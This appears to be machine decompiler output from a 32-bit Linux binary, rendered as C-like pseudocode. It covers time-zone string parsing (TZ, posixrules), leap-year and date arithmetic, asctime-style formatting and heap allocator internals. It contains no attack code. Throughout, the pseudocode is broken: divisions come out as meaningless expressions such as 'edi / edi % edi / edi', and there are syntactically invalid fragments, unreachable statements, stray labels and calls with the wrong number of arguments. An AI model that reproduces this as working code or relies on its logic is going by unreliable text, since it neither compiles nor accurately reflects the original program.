/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    ecx = A8;
    if(*ecx == 74) {
        *Ac = 0;
        ecx = ecx + 1;
        (save)365;
        (save)1;
    } else {
        if(*ecx == 77) {
            *Ac = 2;
            ecx = ecx + 1;
            ecx = L0805A5C4(ecx, Ac + 12, 1, 12);
            if(ecx == 0) {
                goto L0805a7bb;
            }
            al = *ecx;
            ecx = ecx + 1;
            if(al != 46) {
                goto L0805a7bb;
            }
            ecx = L0805A5C4(ecx, Ac + 8, 1, 5);
            if(ecx == 0) {
                goto L0805a7bb;
            }
            al = *ecx;
            ecx = ecx + 1;
            if(al != 46) {
                goto L0805a7bb;
            }
            (save)6;
        } else {
            edx = *ecx & 255;
            if(*( *L08078FA0 + edx * 2 + 1) & 8) {
                goto L0805a7bb;
            }
            *Ac = 1;
            (save)365;
        }
        (save)0;
    }
    (save)Ac + 4;
    (save)ecx;
    ecx = L0805A5C4();
    esp = esp + 16;
    if(ecx == 0) {
L0805a7bb:
        eax = 0;
    } else {
        if(*ecx == 47) {
            ecx = ecx + 1;
            ecx = L0805A634(ecx, Ac + 16);
        } else {
            *(Ac + 16) = 7200;
        }
        eax = ecx;
    }
}


L0805A7E4(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffffc;



    ecx = A8;
    Vfffffffc = 0;
    if(!(Ac & 3)) {
        eax = Ac;
        edi = 100;
        asm("cdq");
        if(edi / edi % edi / edi != 0) {
            goto L0805a821;
        }
    }
    eax = Ac;
    edi = 400;
    asm("cdq");
    if(edi / edi % edi / edi == 0) {
L0805a821:
        Vfffffffc = 1;
    }
    eax = *A10;
    if(eax != 1) {
        > ? L0805a840 : ;
        if(eax == 0) {
            if(eax == 2) {
                goto L0805a8ac;
            }
            goto L0805aaa8;
            edi = *(A10 + 4) - 1;
            esi = ((edi + (edi + (edi + edi * 4) * 4) * 8 << 2) - edi << 7) + ecx;
            if(Vfffffffc != 0 && *(A10 + 4) > 59) {
                esi = esi + 86400;
            }
        }
    } else {
        edi = *(A10 + 4);
        esi = ((edi + (edi + (edi + edi * 4) * 4) * 8 << 2) - edi << 7) + ecx;
        goto L0805aaa8;
L0805a8ac:
        esi = ecx;
        ebx = 0;
        edx = *(A10 + 12) - 1;
        Vfffffff4 = edx;
        if(0 < edx) {
            edi = Vfffffffc;
            ecx = edi + edi + edi << 4;
            if(eax = edx & 3) {
                goto L0805a944;
            }
            if(eax > 1) {
                if(eax > 2) {
                    edx = *(ecx + 0x8068ec8);
                    esi = esi + ((edx + (edx + (edx + edx * 4) * 4) * 8 << 2) - edx << 7);
                    ecx = ecx + 4;
                    ebx = 1;
                }
                edx = *(ecx + 0x8068ec8);
                esi = esi + ((edx + (edx + (edx + edx * 4) * 4) * 8 << 2) - edx << 7);
                ecx = ecx + 4;
                ebx = ebx + 1;
            }
            edx = *(ecx + 0x8068ec8);
            esi = esi + ((edx + (edx + (edx + edx * 4) * 4) * 8 << 2) - edx << 7);
            ecx = ecx + 4;
            ebx = ebx + 1;
            if(Vfffffff4 > ebx) {
L0805a944:
                edx = *(ecx + 0x8068ec8);
                esi = esi + ((edx + (edx + (edx + edx * 4) * 4) * 8 << 2) - edx << 7);
                edx = *(ecx + 0x8068ecc);
                esi = esi + ((edx + (edx + (edx + edx * 4) * 4) * 8 << 2) - edx << 7);
                edx = *(ecx + 0x8068ed0);
                esi = esi + ((edx + (edx + (edx + edx * 4) * 4) * 8 << 2) - edx << 7);
                edx = *(ecx + 0x8068ed4);
                esi = esi + ((edx + (edx + (edx + edx * 4) * 4) * 8 << 2) - edx << 7);
                ecx = ecx + 16;
                ebx = ebx + 4;
                if(Vfffffff4 > ebx) {
                    goto L0805a944;
                }
            }
        }
        Vfffffff4 = *(A10 + 12) + 9;
        eax = Vfffffff4;
        edi = 12;
        asm("cdq");
        Vfffffff4 = edi / edi % edi / edi + 1;
        eax = Ac;
        if(*(A10 + 12) <= 2) {
            eax = eax - 1;
        }
        edi = 100;
        asm("cdq");
        ebx = edi / edi % edi / edi;
        ecx = eax;
        edx = Vfffffff4;
        eax = edx + edx + edx * 4 + (edx + edx * 4) * 4 - 2;
        Vfffffff4 = eax;
        edi = 10;
        asm("cdq");
        edx = edi / edi % edi / edi;
        Vfffffff4 = eax + ebx + 1;
        eax = ebx;
        if(eax < 0) {
            eax = eax + 3;
        }
        Vfffffff4 = Vfffffff4 + (eax >> 2);
        eax = ecx;
        if(ecx < 0) {
            eax = ecx + 3;
        }
        Vfffffff4 = Vfffffff4 + (eax >> 2);
        Vfffffff4 = Vfffffff4 - ecx + ecx;
        eax = Vfffffff4;
        edi = 7;
        asm("cdq");
        edx = edi / edi % edi / edi;
        Vfffffff4 = edx;
        if(edx < 0) {
            Vfffffff4 = edx + 7;
        }
        if(!(ecx = *(A10 + 4) - Vfffffff4)) {
            ecx = ecx + 7;
        }
        ebx = 1;
        if(*(A10 + 8) > 1) {
            Vfffffff4 = (Vfffffffc + Vfffffffc + Vfffffffc << 4) + *(edi + 12) * 4;
L0805aa7c:
            eax = ecx + 7;
            if(*(Vfffffff4 + "/") > eax) {
                ecx = eax;
                ebx = ebx + 1;
                if(*(A10 + 8) != ebx) {
                    goto L0805aa7c;
                }
            }
        }
        esi = esi + ((ecx + (ecx + (ecx + ecx * 4) * 4) * 8 << 2) - ecx << 7);
    }
L0805aaa8:
    eax = esi;
    eax = eax + *(A10 + 16) + A14;
    esp = ebp - 28;
}



L0805AAC0(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffa8;
	/* unknown */ void  Vffffffac;
	/* unknown */ void  Vffffffb0;
	/* unknown */ void  Vffffffb4;
	/* unknown */ void  Vffffffb8;
	/* unknown */ void  Vffffffbc;
	/* unknown */ void  Vffffffc0;
	/* unknown */ void  Vffffffc4;
	/* unknown */ void  Vffffffc8;
	/* unknown */ void  Vffffffcc;
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    ebx = A8;
    Vffffffcc = ebx;
    if(A10 == 0) {
        ebx = L0805A584(ebx);
        ecx = ebx - Vffffffcc;
        Vffffffc4 = ecx;
        if(Vffffffc4 > 2) {
            goto L0805ab1a;
        }
L0805aaed:
        eax = -1;
    } else {
        al = 0;
        edi = ebx;
        asm("cld");
        ecx = -1;
        asm("repne scasb");
        eax = !ecx - 1;
        Vffffffc4 = eax;
        ebx = ebx + eax;
        if(eax > 50) {
            Vffffffc4 = 50;
        }
L0805ab1a:
        if(*ebx == 0) {
            goto L0805aaed;
        }
        ebx = L0805A6C8(ebx, & Vfffffffc);
        if(ebx == 0) {
            goto L0805aaed;
        }
        edi = Ac;
        esi = L0805A254("posixrules", edi);
        if(esi != 0) {
            *edi = 0;
        }
        if(*ebx != 0) {
            Vffffffc8 = ebx;
            eax = L0805A584(ebx);
            ebx = eax;
            ecx = ebx - Vffffffc8;
            Vffffffc0 = ecx;
            if(Vffffffc0 <= 2) {
                goto L0805aaed;
            }
            if(*ebx != 0 && *ebx != 44 && *ebx != 59) {
                eax = L0805A6C8(ebx, & Vfffffff8);
                ebx = eax;
                if(ebx != 0) {
                    goto L0805abac;
                }
                goto L0805aaed;
            }
            Vfffffff8 = Vfffffffc + -3600;
L0805abac:
            if(*ebx == 44 || *ebx == 59) {
                ebx = ebx + 1;
                (save) & Vffffffe4;
                ebx = L0805A720(ebx);
                if(ebx == 0) {
                    goto L0805aaed;
                }
                al = *ebx;
                ebx = ebx + 1;
                if(al != 44) {
                    goto L0805aaed;
                }
                (save) & Vffffffd0;
                ebx = L0805A720(ebx);
                if(ebx == 0 || *ebx != 0) {
                    goto L0805aaed;
                }
                *(Ac + 8) = 2;
                *(ecx + 4) = 136;
                *(ecx + 1868) = ~Vfffffff8;
                *(ecx + 1872) = 1;
                *(ecx + 1876) = Vffffffc4 + 1;
                *(ecx + 1884) = ~Vfffffffc;
                *(ecx + 1888) = 0;
                *(ecx + 1892) = 0;
                esi = Ac + 16;
                ebx = Ac + 1496;
                Vffffffbc = 0;
                Vffffffa8 = 1970;
                do {
                    edi = Vffffffbc;
                    Vffffffb8 = L0805A7E4(edi, Vffffffa8, & Vffffffe4, Vfffffffc);
                    eax = L0805A7E4(edi, Vffffffa8, & Vffffffd0, Vfffffff8);
                    if(Vffffffb8 <= eax) {
                        *esi = Vffffffb8;
                        esi = esi + 4;
                        *ebx = 0;
                        ebx = ebx + 1;
                        *esi = eax;
                        esi = esi + 4;
                        *ebx = 1;
                    } else {
                        *esi = eax;
                        esi = esi + 4;
                        *ebx = 1;
                        ebx = ebx + 1;
                        *esi = Vffffffb8;
                        esi = esi + 4;
                        *ebx = 0;
                    }
                    ebx = ebx + 1;
                    Vffffffac = 0;
                    edi = Vffffffa8;
                    if(!(edi & 3)) {
                        eax = edi;
                        ecx = 100;
                        asm("cdq");
                        if(ecx / ecx % ecx / ecx != 0) {
                            goto L0805acf8;
                        }
                    }
                    eax = Vffffffa8;
                    edi = 400;
                    asm("cdq");
                    if(edi / edi % edi / edi == 0) {
L0805acf8:
                        Vffffffac = 1;
                    }
                    edx = *(Vffffffac * 4 + 0x8068f28);
                    Vffffffbc = Vffffffbc + ((edx + (edx + (edx + edx * 4) * 4) * 8 << 2) - edx << 7);
                    Vffffffa8 = Vffffffa8 + 1;
                } while(Vffffffa8 <= 2037);
            } else {
                if(*ebx != 0 || esi != 0) {
                    goto L0805aaed;
                }
                Vffffffb4 = 0;
                ebx = 0;
                Vffffffa8 = 0;
                esi = 0;
                Vffffffac = 0;
                if(*(Ac + 8) > Vffffffac) {
                    Vffffffb0 = ~Vfffffff8;
                    eax = 0;
                    do {
                        ecx = Ac;
                        if(*(eax + ecx + 1872) == 0) {
                            edx = Vffffffa8;
                            edi = *(eax + Ac + 1868) + Vfffffffc;
                            Vffffffa8 = edi;
                            if(Vffffffb4 != 0 && edx != edi) {
                                goto L0805aaed;
                            }
                            ecx = Ac;
                            *(eax + ecx + 1868) = ~Vfffffffc;
                            *(eax + ecx + 1876) = 0;
                            Vffffffb4 = 1;
                        } else {
                            edx = esi;
                            esi = *(eax + ecx + 1868) + Vfffffff8;
                            if(ebx != 0 && edx != esi) {
                                goto L0805aaed;
                            }
                            edi = Ac;
                            *(eax + edi + 1868) = Vffffffb0;
                            *(eax + edi + 1876) = Vffffffc4 + 1;
                            ebx = 1;
                        }
                        eax = eax + 16;
                        Vffffffac = Vffffffac + 1;
                    } while(*(Ac + 8) > Vffffffac);
                }
                if(ebx == 0 || Vffffffb4 == 0) {
                    goto L0805aaed;
                }
                ebx = 0;
                Vffffffac = 0;
                if(*(Ac + 4) > Vffffffac) {
                    do {
                        ecx = Ac;
                        edi = Vffffffac;
                        edx = ecx + (( *(edi + ecx + 1496) & 255) << 4) + 1868;
                        eax = *(ecx + edi * 4 + 16);
                        eax = ebx == 0 || *(edx + 12) != 0 ? eax + Vffffffa8 : eax + esi;
                        ecx = Vffffffac;
                        edi = Ac;
                        *(edi + ecx * 4 + 16) = eax;
                        ebx = *(edx + 4);
                        ecx = ecx + 1;
                        Vffffffac = ecx;
                    } while(*(edi + 4) > Vffffffac);
                }
            }
        } else {
            Vffffffc0 = 0;
            ecx = Ac;
            *(ecx + 8) = 1;
            *(ecx + 4) = 0;
            *(ecx + 1868) = ~Vfffffffc;
            *(ecx + 1872) = 0;
            *(ecx + 1876) = 0;
        }
        ecx = Ac;
        *(ecx + 12) = Vffffffc4 + 1;
        if(Vffffffc0 != 0) {
            *(ecx + 12) = *(ecx + 12) + 1 + Vffffffc0;
        }
        if(*(Ac + 12) > 51) {
            goto L0805aaed;
        }
        ebx = Ac + 5964;
        edi = Vffffffc4;
        L0805680C(ebx, Vffffffcc, edi);
        ebx = ebx + edi;
        *ebx = 0;
        ebx = ebx + 1;
        if(Vffffffc0 != 0) {
            edi = Vffffffc0;
            L0805680C(ebx, Vffffffc8, edi);
            *(edi + ebx) = 0;
        }
        eax = 0;
    }
    esp = ebp - 100;
}



L0805AF2C(A8)
/* unknown */ void  A8;
{



    eax = L0805A254(0x8068ea0, A8);
    if(eax != 0) {
        eax = L0805AAC0(0x8068ea0, A8, 1);
    }
}



L0805AF5C()
{
	/* unknown */ void  ebx;



    ebx = L08055668("TZ");
    if(ebx == 0) {
        eax = L0805B010();
    } else {
        *L0807E300 = 1;
        if(*ebx == 0) {
            *L0807B0E0 = 0;
            *L0807B0E4 = 0;
            *L0807B82C = 0;
            *L0807B834 = 0;
            (save)0x8068ea0;
            L08056640(0x807c82c);
        } else {
            if(L0805A254(ebx, 0x807b0e0) != 0) {
                if(*ebx == 58) {
                    goto L0805aff7;
                }
                if(L0805AAC0(ebx, 0x807b0e0, 0) != 0) {
L0805aff7:
                    L0805AF2C(0x807b0e0);
                }
            }
        }
        eax = L0805A11C();
    }
}


L0805B010()
{



    *L0807E300 = 1;
    if(L0805A254(0, 0x807b0e0) != 0) {
        L0805AF2C(0x807b0e0);
    }
    return(L0805A11C());
}



L0805B048(A8, A10)
/* unknown */ void  A8;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vfffffffc;



    Vfffffffc = *A8;
    if(*L0807E300 == 0) {
        L0805AF5C();
    }
    esi = 0x807b0e0;
    if(*L0807B0E4 != 0 && *L0807B0F0 <= Vfffffffc) {
        goto L0805b0ac;
    }
    eax = 0;
    if(*(esi + 1872) != 0) {
        edx = 0;
        do {
            edx = edx + 16;
            eax = eax + 1;
            if(*(esi + 8) <= eax) {
                goto L0805b0a8;
            }
        } while(*(edx + esi + 1872) != 0);
        goto L0805b0d0;
L0805b0a8:
        eax = 0;
        goto L0805b0d0;
L0805b0ac:
        eax = 1;
        if(*(esi + 4) > 1) {
            edx = Vfffffffc;
            do {
                if(*(esi + eax * 4 + 16) > edx) {
                    break;
                }
                eax = eax + 1;
            } while(*(esi + 4) > eax);
        }
        eax = *(eax + esi + 1495) & 255;
    }
L0805b0d0:
    ebx = esi + (eax << 4) + 1868;
    L0805B1C4( & Vfffffffc, *ebx, esi, A10);
    edx = *(ebx + 4);
    *(A10 + 32) = edx;
    eax = *(ebx + 8) + 5964;
    *(edx * 4 + 0x8078b1c) = esi + eax;
    esp = ebp - 16;
}



L0805B10C(A8)
/* unknown */ void  A8;
{



    L0805B048(A8, 0, 0x807b06c);
    return(0x807b06c);
}






L0805B1C4(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    Vfffffffc = 0;
    Vfffffff8 = 0;
    if(!(ecx = *A10 - 1)) {
        esi = *A8;
        edi = ecx * 8;
        Vfffffff4 = edi;
        Vfffffff0 = Vfffffff4 + -8;
        eax = Vfffffff4 + 6016;
        Vffffffe4 = eax;
        edx = !ecx & 3;
        if(ecx > -1) {
            if(edx == 0) {
                goto L0805b27c;
            }
            if(edx < 3) {
                if(edx < 2) {
                    edx = A10 + eax;
                    if(*edx <= esi) {
                        != ? 0x805b349 : ;
                        edi = Vfffffff8;
                        goto L0805b31f;
                    }
                    Vfffffff0 = Vfffffff0 + -8;
                    Vffffffe4 = Vffffffe4 + -8;
                    ecx = ecx - 1;
                }
                edx = A10 + Vffffffe4;
                if(*edx <= esi) {
                    goto L0805b31b;
                }
                Vfffffff0 = Vfffffff0 + -8;
                Vffffffe4 = Vffffffe4 + -8;
                ecx = ecx - 1;
            }
        }
        edx = A10 + Vffffffe4;
        if(*edx > esi) {
            Vfffffff0 = Vfffffff0 + -8;
            Vffffffe4 = Vffffffe4 + -8;
            if(ecx = ecx - 1) {
                goto L0805b363;
            }
L0805b27c:
            do {
                edx = A10 + Vffffffe4;
                if(*edx <= esi) {
                    goto L0805b31b;
                }
                Vfffffff0 = Vfffffff0 + -8;
                ecx = ecx - 1;
                edx = A10 + Vffffffe4 - 8;
                if(*edx <= esi) {
                    goto L0805b29d;
                }
                Vfffffff0 = Vfffffff0 + -8;
                ecx = ecx - 1;
                edx = A10 + Vffffffe4 - 16;
                if(*edx <= esi) {
                    goto L0805b2df;
                }
                Vfffffff0 = Vfffffff0 + -8;
                ecx = ecx - 1;
                edx = A10 + Vffffffe4 - 24;
                if(*edx <= esi) {
                    goto L0805b31b;
                }
                Vfffffff0 = Vfffffff0 + -8;
                Vffffffe4 = Vffffffe4 + -32;
            } while(ecx = ecx - 1);
            goto L0805b363;
L0805b29d:
            != ? 0x805b349 : ;
            Vfffffff8 = 0;
            if(ecx == 0 && *(edx + 4) > 0) {
                goto L0805b342;
            }
            ebx = *(edx + 4);
            if(*(Vfffffff0 + A10 + 6020) >= ebx) {
                goto L0805b349;
            }
            goto L0805b342;
L0805b2df:
            != ? 0x805b349 : ;
            Vfffffff8 = 0;
            if(ecx == 0 && *(edx + 4) > 0) {
                goto L0805b342;
            }
            eax = *(edx + 4);
            if(*(Vfffffff0 + A10 + 6020) >= eax) {
                goto L0805b349;
            }
            goto L0805b342;
        }
L0805b31b:
        if(*edx == esi) {
L0805b31f:
            Vfffffff8 = 0;
            if(ecx == 0 && *(edx + 4) > 0) {
                goto L0805b342;
            }
            edi = *(edx + 4);
            if(*(Vfffffff0 + A10 + 6020) < edi) {
L0805b342:
                Vfffffff8 = 1;
            }
        }
L0805b349:
        Vfffffffc = *(edx + 4);
    }
L0805b363:
    eax = *A8;
    ebx = 86400;
    asm("cdq");
    edx = ebx / ebx % ebx / ebx;
    esi = eax;
    edi = Ac - Vfffffffc;
    Vfffffff4 = edi;
    if(!(edx = edx + Vfffffff4)) {
        do {
            esi = esi - 1;
        } while(edx = edx + 86400);
    }
    while(edx > 86399) {
        edx = edx + -86400;
        esi = esi + 1;
    }
    eax = edx;
    ebx = 3600;
    asm("cdq");
    edx = ebx / ebx % ebx / ebx;
    ecx = eax;
    edi = A14;
    *(edi + 8) = ecx;
    eax = edx;
    ebx = 60;
    asm("cdq");
    edx = ebx / ebx % ebx / ebx;
    *(edi + 4) = eax;
    *edi = edx;
    if(Vfffffff8 != 0) {
        *edi = *edi + 1;
    }
    eax = esi + 4;
    ebx = 7;
    asm("cdq");
    edx = ebx / ebx % ebx / ebx;
    edi = A14;
    *(edi + 24) = edx;
    if(edx < 0) {
        *(edi + 24) = *(edi + 24) + 7;
    }
    Vfffffff0 = 1970;
    if(esi >= 0) {
        while(1) {
            Vffffffe4 = 0;
            eax = Vfffffff0;
            if(!(al & 3)) {
                ebx = 100;
                asm("cdq");
                if(ebx / ebx % ebx / ebx != 0) {
                    goto L0805b419;
                }
            }
            eax = Vfffffff0;
            ebx = 400;
            asm("cdq");
            if(ebx / ebx % ebx / ebx == 0) {
L0805b419:
                Vffffffe4 = 1;
            }
            edi = Vffffffe4;
            if(*(edi * 4 + 0x8068f28) > esi) {
                goto L0805b477;
            }
            Vfffffff0 = Vfffffff0 + 1;
            esi = esi - *(edi * 4 + 0x8068f28);
        }
    }
    do {
        Vfffffff0 = Vfffffff0 - 1;
        Vffffffe4 = 0;
        eax = Vfffffff0;
        if(!(al & 3)) {
            ebx = 100;
            asm("cdq");
            if(ebx / ebx % ebx / ebx != 0) {
                goto L0805b464;
            }
        }
        eax = Vfffffff0;
        ebx = 400;
        asm("cdq");
        if(ebx / ebx % ebx / ebx == 0) {
L0805b464:
            Vffffffe4 = 1;
        }
    } while(esi = esi + *(Vffffffe4 * 4 + 0x8068f28));
L0805b477:
    eax = A14;
    *(eax + 20) = Vfffffff0 + -1900;
    *(eax + 28) = esi;
    eax = Vffffffe4;
    edi = Vffffffe4 + Vffffffe4 + eax << 4;
    edx = edi + 0x8068ec8;
    *(A14 + 16) = 0;
    if(*(edi + 0x8068ec8) <= esi) {
        do {
            esi = esi - *(edx + *(A14 + 16) * 4);
            eax = A14;
            *(eax + 16) = *(eax + 16) + 1;
        } while(*(edx + *(eax + 16) * 4) <= esi);
    }
    esi = esi + 1;
    edi = A14;
    *(edi + 12) = esi;
    *(edi + 32) = 0;
    esp = ebp - 40;
}



L0805B4E0(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    (save) *(A8 + 20) + 1900;
    (save) *A8;
    (save) *(A8 + 4);
    (save) *(A8 + 8);
    (save) *(A8 + 12);
    (save) *(A8 + 16) + *(A8 + 16) * 2 + "JanFebMarAprMayJunJulAugSepOctNovDec%.3s %.3s%3d %02.2d:%02.2d:%02.2d %d\n";
    L0804F808(Ac, "%.3s %.3s%3d %02.2d:%02.2d:%02.2d %d\n", *(A8 + 24) + *(A8 + 24) * 2 + "SunMonTueWedThuFriSatJanFebMarAprMayJunJulAugSepOctNovDec%.3s %.3s%3d %02.2d:%02.2d:%02.2d %d\n");
    return(Ac);
}



L0805B530(A8)
/* unknown */ void  A8;
{



    (save)0x807b0c4;
    return(L0805B4E0(A8));
}



L0805B548(A8)
/* unknown */ void  A8;
{



    return(L0805B530(L0805B10C(A8)));
}













L0805BA88(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;



    ebx = A8;
    esi = 4;
    edx = 4095;
    if(*L08078F44 > *L08078F80) {
        ebx = ebx + 4 + 4095;
        ebx = ebx & !L00000FFF;
        eax = mmap(0, ebx, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if(eax != -1) {
            goto L0805bacc;
        }
    }
    eax = 0;
    goto L0805bb28;
L0805bacc:
    *L08078F80 = *L08078F80 + 1;
    edx = *L08078F80;
    if(*L08078F84 < edx) {
        *L08078F84 = edx;
    }
    edx = esi + eax;
    *(edx - 4) = esi;
    *edx = ebx - esi | 2;
    eax = ebx + *L08078F88;
    *L08078F88 = eax;
    if(*L08078F8C < eax) {
        *L08078F8C = eax;
    }
    eax = *L08078F88 + *L08078F58;
    if(*L08078F54 < eax) {
        *L08078F54 = eax;
    }
    eax = edx;
L0805bb28:
}



L0805BB34(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;



    edx = *(A8 - 4);
    ebx = ( *A8 & 252) + edx;
    *L08078F80 = *L08078F80 - 1;
    *L08078F88 = *L08078F88 - ebx;
    return(munmap(A8 - edx, ebx));
}





L0805BBF4(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    edx = *L08078B38;
    Vfffffffc = edx;
    cl = *edx & 252;
    Vfffffff8 = ecx;
    ebx = edx + Vfffffff8;
    esi = A8 + *L08078F40 + 16;
    if(*L08078F4C != -1) {
        esi = esi + 4095 & -4096;
    }
    eax = *( *L08078B30)(esi);
    edi = eax;
    if(edi != 0) {
        if(edi >= ebx) {
            goto L0805bc59;
        }
        if(Vfffffffc == 0x8078b34) {
L0805bc59:
            *L08078F58 = *L08078F58 + esi;
            if(edi == ebx) {
                esi = esi + Vfffffff8;
                *( *L08078B38) = esi | 1;
                goto L0805bd3f;
            }
            if(*L08078F4C == -1) {
                *L08078F4C = edi;
            } else {
                *L08078F58 = *L08078F58 + edi - ebx;
            }
            if(!(eax = edi + 4 & 7)) {
                ebx = 8 - eax;
                edi = edi + ebx;
            } else {
                ebx = 0;
            }
            eax = esi + edi;
            eax = eax & 4095;
            ebx = ebx + 4096 - eax;
            eax = *( *L08078B30)(ebx);
            if(eax != 0) {
                *L08078F58 = *L08078F58 + ebx;
                *L08078B38 = edi;
                *edi = eax - edi + ebx | 1;
                if(Vfffffffc != 0x8078b34) {
                    edx = Vfffffff8;
                    ecx = Vfffffffc;
                    *(ecx + edx - 8) = 5;
                    *(ecx + edx - 4) = 5;
                    edx = edx + -8 & 7;
                    Vfffffff8 = edx;
                    *(edx + ecx) = 5;
                    *(ecx + edx + 4) = 5;
                    *ecx = *ecx & 1 | edx;
                    if(edx > 15) {
                        L0805C290(Vfffffffc + 4);
                    }
                }
L0805bd3f:
                eax = *L08078F58;
                if(*L08078F50 < eax) {
                    *L08078F50 = eax;
                }
                eax = *L08078F88 + *L08078F58;
                if(*L08078F54 < eax) {
                    *L08078F54 = eax;
                }
            }
        }
    }
    esp = ebp - 24;
}



L0805BD74(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    eax = A8;
    if(eax > 11) {
        Vfffffff4 = eax + 11;
        Vfffffff4 = Vfffffff4 & -8;
    } else {
        Vfffffff4 = 16;
    }
    if(Vfffffff4 <= 503) {
        ecx = Vfffffff4 >> 3;
        Vfffffffc = ecx;
        ebx = *(ecx * 8 + 0x8078b3c);
        if(ebx == ecx * 8 + 0x8078b34) {
            ebx = *(ecx * 8 + 0x8078b44);
            if(ebx == ecx * 8 + 0x8078b3c) {
                goto L0805bee5;
            }
        }
        edi = *ebx & -4;
        Vffffffec = edi;
        esi = *(ebx + 8);
        ecx = *(ebx + 4);
        Vfffffff0 = ecx;
        *(ecx + 8) = esi;
        *(esi + 4) = ecx;
        *(Vffffffec + ebx) = *(Vffffffec + ebx) | 1;
    } else {
        eax = Vfffffff4 >> 9;
        if(!(Vfffffffc = Vfffffffc + 2)) {
            Vfffffffc = Vfffffff4 >> 3;
        } else {
            if(Vfffffff4 >> 9 <= 4) {
                Vfffffffc = (Vfffffff4 >> 6) + 56;
            } else {
                eax = Vfffffff4 >> 9;
                if(eax <= 20) {
                    Vfffffffc = eax + 91;
                } else {
                    if(Vfffffff4 >> 9 <= 84) {
                        Vfffffffc = (Vfffffff4 >> 12) + 110;
                    } else {
                        if(Vfffffff4 >> 9 <= 340) {
                            Vfffffffc = (Vfffffff4 >> 15) + 119;
                        } else {
                            if(Vfffffff4 >> 9 <= 1364) {
                                Vfffffffc = (Vfffffff4 >> 18) + 124;
                                goto L0805beab;
L0805be9c:
                                Vfffffffc = Vfffffffc - 1;
                                goto L0805bee2;
                            }
                            Vfffffffc = 126;
                        }
                    }
                }
            }
        }
L0805beab:
        ecx = Vfffffffc * 8 + 0x8078b34;
        Vfffffff8 = ecx;
        ebx = *(ecx + 8);
        if(ebx != ecx) {
            do {
                edi = *ebx & -4;
                Vffffffec = edi;
                edx = Vffffffec - Vfffffff4;
                if(edx > 15) {
                    goto L0805be9c;
                }
                if(edx >= 0) {
                    goto L0805c1f0;
                }
                ebx = *(ebx + 8);
            } while(Vfffffff8 != ebx);
        }
L0805bee2:
        Vfffffffc = Vfffffffc + 1;
L0805bee5:
        ebx = *L08078B40;
        if(ebx != 0x8078b3c) {
            cl = *ebx & 252;
            Vffffffec = ecx;
            edx = Vffffffec - Vfffffff4;
            if(edx > 15) {
                eax = Vfffffff4 + ebx;
                *ebx = Vfffffff4 | 1;
                *L08078B44 = eax;
                *L08078B40 = eax;
                *(eax + 8) = 0x8078b3c;
                *(eax + 4) = 0x8078b3c;
                *eax = edx | 1;
                *(edx + eax - 4) = edx;
                goto L0805c281;
            }
            *L08078B44 = 0x8078b3c;
            *L08078B40 = 0x8078b3c;
            if(edx >= 0) {
                *(Vffffffec + ebx) = *(Vffffffec + ebx) | 1;
                goto L0805c281;
            }
            if(Vffffffec <= 511) {
                edx = Vffffffec >> 3;
                eax = edx;
                >= ? 0x805bf7a : ;
                eax = edx + 3;
                eax = eax >> 2;
                ecx = eax;
                *L08078B34 = *L08078B34 | 1 << cl;
                ecx = *(esi + 4);
                Vfffffff0 = ecx;
                *(ebx + 8) = esi;
                *(ebx + 4) = ecx;
                *(esi + 4) = ebx;
                *( *(ebx + 4) + 8) = ebx;
            } else {
                eax = Vffffffec >> 9;
                if(!(esi = edx * 8 + 0x8078b34)) {
                    edx = Vffffffec >> 3;
                } else {
                    if(Vffffffec >> 9 <= 4) {
                        edx = (Vffffffec >> 6) + 56;
                    } else {
                        eax = Vffffffec >> 9;
                        edx = eax <= 20 ? eax + 91 : Vffffffec >> 9 <= 84 ? (Vffffffec >> 12) + 110 : Vffffffec >> 9 <= 340 ? (Vffffffec >> 15) + 119 : Vffffffec >> 9 <= 1364 ? (Vffffffec >> 18) + 124 : 126;
                    }
                }
                esi = edx * 8 + 0x8078b34;
                edi = *(esi + 4);
                Vfffffff0 = edi;
                if(Vfffffff0 == esi) {
                    eax = edx >> 2;
                    ecx = eax;
                    *L08078B34 = *L08078B34 | 1 << cl;
                } else {
                    do {
                        ecx = Vfffffff0;
                        if(Vffffffec >= ( *ecx & 252)) {
                            break;
                        }
                        edi = *(ecx + 4);
                        Vfffffff0 = edi;
                    } while(Vfffffff0 != esi);
                    esi = *(Vfffffff0 + 8);
                }
                *(ebx + 8) = esi;
                edi = Vfffffff0;
                *(ebx + 4) = edi;
                *(esi + 4) = ebx;
                *( *(ebx + 4) + 8) = ebx;
            }
        }
        eax = Vfffffffc;
        if(eax < 0) {
            eax = eax + 3;
        }
        eax = eax >> 2;
        ecx = eax;
        edi = 1 << cl;
        Vfffffff0 = edi;
        if(*L08078B34 >= edi) {
